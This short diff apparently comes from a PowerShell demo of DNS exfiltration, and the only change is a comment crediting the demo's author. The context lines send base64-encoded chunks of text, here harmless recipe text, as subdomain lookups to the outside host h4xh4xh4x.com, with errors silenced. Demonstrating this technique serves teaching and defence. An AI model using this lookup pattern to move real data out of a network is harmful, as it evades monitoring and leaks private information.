@@ -1,4 +1,5 @@
 #mypieceofdata.server1.example.com
+#Shout out to Chris MacKinnon for taking the initiative to put this demo together.
 
 Resolve-DnsName U2VydmluZyBTaXplICA6IDYgCgogIEFtb3VudCAgTWVhc3VyZSAg.h4xh4xh4x.com -ErrorAction SilentlyContinue -QuickTimeout
 Resolve-DnsName ICAgICBJbmdyZWRpZW50IAotLS0tLS0tLSAgLS0tLS0tLS0tLS0t.h4xh4xh4x.com -ErrorAction SilentlyContinue -QuickTimeout
